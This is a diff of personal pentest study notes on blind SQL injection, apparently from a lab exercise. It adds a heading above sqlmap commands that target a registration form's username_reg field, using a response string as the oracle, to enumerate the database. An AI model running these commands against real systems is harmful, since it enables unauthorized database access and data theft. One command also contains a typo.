@@ -157,6 +157,7 @@ asks the database true or false questions and determines the answer based on the
 * sql map to find a spefic string in the response "please try to..." and sql attack only username_reg also return DB
 `sqlmap -r request.txt --string "please try to register with a different username" -p username_reg --threads 1`
 
+# Process for sql (automated)
 1) locate vuln field (check blind sql) or automated: `ssqlmap -r /home/kali/Documents/sqlInj2.raw --string "please try to register with a different username" --thread=1` dbms we get from this response
 
 2) get db from the vuln field: `sqlmap -r "/home/kali/Documents/sqlInj.raw" --string "please try to register with a different username" -p username_reg --threads 1 --dbms="HSQLDB" --current-db`
